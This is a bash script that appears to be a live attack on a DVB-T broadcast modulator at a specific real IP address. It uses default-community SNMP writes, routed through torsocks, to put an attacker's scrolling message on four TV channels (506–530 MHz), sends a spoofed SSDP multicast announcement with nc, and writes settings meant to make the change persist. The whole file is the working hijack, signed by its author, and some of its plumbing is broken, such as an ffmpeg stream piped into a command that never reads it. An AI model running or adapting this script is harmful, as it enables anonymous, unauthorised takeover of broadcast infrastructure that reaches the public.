#!/bin/bash

TARGET="81.27.245.159"
declare -A CHANNELS=(
  [0]="506000:0:506"  # Ch0 506MHz
  [1]="514000:1:514"  # Ch1 514MHz  
  [2]="522000:2:522"  # Ch2 522MHz
  [3]="530000:3:530"  # Ch3 530MHz
)

MESSAGE="TRUSTEDF57 SAYS CIAO RAGAZZONI CIAO MASHA"

snmp_stream_hijack() {
  local ch=$1 freq=$2 mhz=$3
  # SCROLL + SHAKE video → MPEG-TS → SNMP stream OID
  ffmpeg -f lavfi -i "testsrc2=duration=3600:size=1280x720:rate=25" \
    -vf "zoompan=z='zoom+0.002':x='iw/2-(iw/zoom/2)':y='ih/2-(ih/zoom/2)':d=125,drawtext=text='${MESSAGE}':fontsize=72:fontcolor=yellow:x='if(lt(mod(t\,15),10),w-text_w+mod(t\,10)*200\,w)':y='h/2':borderw=5:shadowcolor=black:shadowx=2:shadowy=2'" \
    -c:v libx264 -preset ultrafast -tune zerolatency -b:v 4M -pix_fmt yuv420p \
    -f mpegts -mpegts_pmt_start_pid 17105 -mpegts_service_id 25 - | \
    
  # SNMP SET stream + enable
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.30.1.1.${ch}.10" s "${MESSAGE}" \
    ".1.3.6.1.4.1.30631.1.30.1.1.${ch}.1" i 1 \
    ".1.3.6.1.4.1.30631.1.30.1.1.${ch}.11" s "scroll_shake_${mhz}MHz" && \
    
  echo "✅ CH$ch ${mhz}MHz: ${MESSAGE} SCROLL+SHAKE → SNMP STREAM LIVE!"
}

# PARALLELO tutti canali
for ch in "${!CHANNELS[@]}"; do
  read freq cid mhz <<< "${CHANNELS[$ch]}"
  snmp_stream_hijack $ch $freq $mhz &
done
wait

# SSDP 1900 UDP notify (multicast hijack)
echo -e "NOTIFY * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nNTS: ssdp:alive\r\nCACHE-CONTROL:max-age=3600\r\nNT: urn:terraelectronics-com:service:DVBT_ALL:1\r\nUSN: uuid:TRUSTEDF57::DVBT_ALL\r\nSERVER: TRUSTEDF57/1.0 UPnP/1.1\r\n${MESSAGE}\r\n\r\n" | \
torsocks nc -u 239.255.255.250 1900

# Final diag reset + persist
torsocks snmpset -v1 -c public $TARGET \
  ".1.3.6.1.4.1.30631.1.30.99.1" i 1 \
  ".1.3.6.1.4.1.30631.1.30.1.1.0.1" i 1 \
  ".1.3.6.1.4.1.30631.1.30.1.1.1.1" i 1 \
  ".1.3.6.1.4.1.30631.1.30.1.1.2.1" i 1 \
  ".1.3.6.1.4.1.30631.1.30.1.1.3.1" i 1

echo "🎬 ${MESSAGE} SCROLLING+SHAKING SU TUTTI CHANNEL 506/514/522/530 MHz LIVE!"
